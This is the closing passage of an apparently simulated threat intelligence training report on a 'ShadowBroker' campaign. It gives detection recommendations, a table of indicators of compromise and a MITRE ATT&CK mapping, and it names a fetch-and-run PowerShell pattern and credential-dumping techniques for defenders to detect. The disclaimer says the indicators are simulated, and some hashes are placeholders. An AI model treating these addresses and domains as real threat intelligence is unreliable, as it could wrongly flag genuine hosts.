| No human intelligence (HUMINT) corroboration | Attribution relies entirely on technical indicators | Law enforcement or partner intelligence service confirmation |
| C2 server logs not fully recovered | Timeline analysis is based on first/last seen data, not full activity logs | Full forensic acquisition of Netherlands and Romanian C2 servers |

---

## Strategic Recommendations

### Immediate (0–30 Days)

**Deploy Behavioural EDR Detections for Process Injection**
ShadowBroker's payload delivery relies entirely on process injection to hide within legitimate Windows processes. Signature-based antivirus will not catch this. Behavioural rules that alert on unexpected memory allocation and code injection into system processes (`svchost.exe`, `explorer.exe`, `lsass.exe`) are the most actionable immediate control.

**Audit All Scheduled Tasks and Run Key Autostarts**
Three of the four documented persistence mechanisms touch scheduled tasks or registry Run keys. A baseline audit of all autostart entries — followed by an alerting rule for any new unsigned executable added to these locations — provides direct detection coverage for the actor's primary persistence strategy.

### Short-Term (30–90 Days)

**Implement PowerShell Script Block Logging (Event ID 4104)**
The fileless persistence mechanism (`IEX(...DownloadString(...))`) executes entirely in memory and evades all process-creation logging. PowerShell Script Block Logging captures the executed content of every PowerShell command — including in-memory `IEX` execution — providing the only reliable detection path for this technique.

**Restrict and Monitor Third-Party Software Supply Chain Access**
Campaign 6 demonstrates the actor's willingness to attack through a trusted software vendor to bypass hardened direct defences. All third-party vendors with code deployment or update access to financial systems must be subject to network segmentation, access review, and update integrity verification.

### Strategic (90+ Days)

**Threat Hunt for Existing DLL Hijacking Persistence**
DLL hijacking is notoriously difficult to detect reactively. Given the actor's documented use of this technique post-Campaign 4, a proactive threat hunt across all endpoints — specifically checking application DLL load orders for unexpected paths — should be conducted to identify any existing persistent implants that may have survived initial incident response.

**Establish Threat Intelligence Sharing with Sector Peers**
ShadowBroker's targeting of multiple financial institutions across the same campaign window suggests concurrent operations against sector peers. Joining a financial sector ISAC (Information Sharing and Analysis Center) and contributing ShadowBroker IOCs — C2 IPs, domain lists, file hashes — accelerates sector-wide detection and reduces the actor's operational return on infrastructure investment.

---

## Consolidated Indicators of Compromise (IOCs)

### IP Addresses
| IP | Status | First Seen | Hosting |
|---|---|---|---|
| `203.0.113.45` | 🟢 Active | 2023-01-15 | CloudServe Inc, Netherlands |
| `198.51.100.78` | 🔴 Dormant | 2023-02-01 | EuroHost, Romania |
| `192.0.2.156` | 🟢 Active | 2023-03-10 | NetServe Solutions, Bulgaria |
| `185.220.101.45` | 🔴 Dormant | 2023-04-15 | Tor Project |
| `185.220.102.8` | Active | — | Cluster A, Netherlands |
| `185.220.103.25` | Active | — | Cluster A, Netherlands |
| `188.40.75.50` | Active | — | Cluster B, Romania |
| `194.67.45.30` | Active | — | Cluster C, Russia |

### Domains
`secureupdate.com` · `verifysession.net` · `systemcheck.org` · `backupverify.net` · `updatecheck.com` · `systemupdate.org` · `checkversion.net` · `command.shadowbroker.net` · `control.shadowbroker.net` · `beacon.shadowbroker.net`

### File Hashes (Truncated)
| MD5 | SHA256 | Size |
|---|---|---|
| `5d41402a...` | `2c26b469...` | 245,760 bytes |
| `7b52009b...` | `e3b0c442...` | 512,000 bytes |
| `3c59dc04...` | `6b86b273...` | 128,512 bytes |
| `1b1a9b5a...` | `d4735fea...` | 256,000 bytes |

### Registry Keys
- `HKLM\Software\Microsoft\Windows\Run\SystemCheck`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\UpdateService`
- `HKLM\System\CurrentControlSet\Services\ShadowCheck`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Run\VersionCheck`

### PDB Artifact
`C:\Users\dev\Projects\shadowbroker\Release\payload.pdb`

---

## Appendix — Full MITRE ATT&CK Matrix

| Tactic | Technique ID | Technique Name | Evidence |
|---|---|---|---|
| Initial Access | T1566.001 | Spearphishing Attachment | Custom phishing framework delivering PE32 payloads |
| Initial Access | T1195.002 | Supply Chain Compromise | Campaign 6 — software vendor pivot to reach downstream financial clients |
| Execution | T1059.001 | PowerShell | Native PowerShell used for initial payload execution and fileless persistence |
| Execution | T1059.003 | Windows Command Shell | PsExec and cmd-based lateral movement |
| Persistence | T1547.001 | Registry Run Keys / Startup Folder | HKLM and HKCU Run keys across all campaigns |
| Persistence | T1053.005 | Scheduled Task/Job | Post-exfiltration persistence re-established in Campaigns 5–6 |
| Persistence | T1574.001 | DLL Hijacking | Applied post-Campaign 4 exfiltration for deep persistent access |
| Defense Evasion | T1055 | Process Injection | Custom payload injected into legitimate Windows processes |
| Defense Evasion | T1027 | Obfuscated Files or Information | XOR encryption applied to all custom binaries |
| Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory | Mimikatz variant used to extract credentials from LSASS memory |
| Discovery | T1016 | System Network Configuration Discovery | Internal network topology mapped before lateral movement |
| Discovery | T1049 | System Network Connections Discovery | Active network sessions enumerated for pivot target identification |
| Lateral Movement | T1550.002 | Use Alternate Authentication Material: Pass the Hash | Stolen NTLM hashes used for remote authentication |
| Lateral Movement | T1021.001 | Remote Services: Remote Desktop Protocol | Authenticated RDP sessions to compromised internal hosts |
| Collection | T1560.001 | Archive Collected Data: Archive via Utility | 7-Zip used to compress 0.8–8.1 GB data archives per campaign |
| Exfiltration | T1041 | Exfiltration Over C2 Channel | Compressed archives transferred via custom encrypted C2 protocol |
| Command and Control | T1071.001 | Application Layer Protocol: Web | HTTP-based C2 communication via IT-themed impersonation domains |

---

> **Disclaimer:** This report was produced as part of a structured Cyber Threat Intelligence training exercise. The ShadowBroker campaign, threat actor TTPs, IOCs, and attribution assessment documented here are based on a simulated dataset provided for educational analysis. No real threat actors, live networks, or production systems were involved. This document is published as a portfolio artifact demonstrating applied threat intelligence methodology.

